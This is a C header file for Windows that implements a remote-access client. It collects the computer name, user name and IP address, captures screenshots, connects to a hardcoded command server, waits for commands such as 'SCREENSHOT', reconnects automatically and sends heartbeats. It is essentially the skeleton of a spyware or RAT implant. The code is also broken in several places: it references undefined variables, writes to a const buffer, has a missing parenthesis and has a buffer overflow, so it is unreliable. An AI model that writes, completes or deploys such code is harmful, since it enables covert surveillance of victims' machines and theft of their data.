#pragma once

#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <gdiplus.h>
#include <iphlpapi.h>
#include <lm.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080
#define HEARTBEAT_INTERVAL 60000 // 1 minute

// Global vars
SOCKET clientSocket = INVALID_SOCKET;

void getMachineInformation() {
	char computerName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size = sizeof(computerName);
	GetComputerNameA(computerName, &size);

	char userName[UNLEN + 1];
	DWORD userNameSize = sizeof(userName);
	GetUserNameA(userName, &userNameSize);

	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
		char machineInfo[1024];
		pAdapter = pAdapterInfo;
		while (pAdapter) {
			if (pAdapter->IpAddressList.IpAddress.String[0] != '0') {
				sprintf(machineInfo, "Computer: %s | User: %s | IP: %s",
					computerName, userName, pAdapter->IpAddressList.IpAddress.String);
				break;
			}
			pAdapter = pAdapter->Next;
		}
	}
	free(pAdapterInfo);
}

void captureScreenshot() {
	HDC hdcScreen = GetDC(NULL), hdcMem = CreateCompatibleDC(hdcScreen);

	int width = GetSystemMetrics(SM_CXSCREEN), height = GetSystemMetrics(SM_CYSCREEN);

	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
	SelectObject(hdcMem, hBitmap);
	BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

	// Save bitmap to memory (in real implementation, would send to server)
	BITMAPFILEHEADER bmfHeader;
	BITMAPINFOHEADER bitmap{
	.biSize = sizeof(BITMAPINFOHEADER),
	.biWidth = width,
	.biHeight = height,
	.biPlanes = 1,
	.biBitCount = 24,
	.biCompression = BI_RGB,
	.biSizeImage = 0,
	.biXPelsPerMeter = 0,
	.biYPelsPerMeter = 0,
	.biClrUsed = 0,
	.biClrImportant = 0,
	};

	DWORD dwBmpSize = ((width * bitmap.biBitCount + 31) / 32) * 4 * height;
	char* lpbitmap = (char*)malloc(dwBmpSize);

	GetDIBits(hdcScreen, hBitmap, 0, height, lpbitmap, (BITMAPINFO*)&bitmap, DIB_RGB_COLORS);

	// In real implementation, would send lpbitmap to server
	// send(clientSocket, lpbitmap, dwBmpSize, 0);
	free(lpbitmap);
	DeleteObject(hBitmap);
	DeleteDC(hdcMem);
	ReleaseDC(NULL, hdcScreen);
}

int connectToServer() {
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { return -1; }

	clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET) {
		WSACleanup();
		return -1;
	}

	sockaddr_in serverAddr{
		.sin_family = AF_INET,
		.sin_port = htons(SERVER_PORT),
		.sin_addr.s_addr = inet_addr(SERVER_IP),
	};

	if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) {
		closesocket(clientSocket);
		WSACleanup();
		return -1;
	}

	// Send machine information to server
	send(clientSocket, machineInfo, strlen(machineInfo), 0);
	return 0;
}

void handleServerCommands() {
	char buffer[1024];
	int bytesReceived;
	for (;;) {
		bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
		if (bytesReceived <= 0) {
			// Connection lost, attempt to reconnect
			Sleep(10000); // Wait 10 seconds before reconnecting
			connectToServer();
			continue;
		}

		buffer[bytesReceived] = '\0';

		if (strcmp(buffer, "SCREENSHOT") == 0) {
			captureScreenshot();
		}
		// Add more commands as needed
	}
}

//send periodic heartbeat
DWORD WINAPI sendHeartbeat(LPVOID lpParam) {
	char const buf[64] = "HEARTBEAT| "; 
	time_t now; tm info;
	for (;;) {
		now = time(NULL);
		localtime_r(now, info);
		strftime(&buf[11], 18, "%H:%M:%S %d.%m.%y", &timeinfo);
		if (send(clientSocket, buf, strlen(buf), 0) < 0) {
			connectToServer();// Connection lost, attempt to reconnect
		}
		Sleep(HEARTBEAT_INTERVAL);
	}
	return 0;
}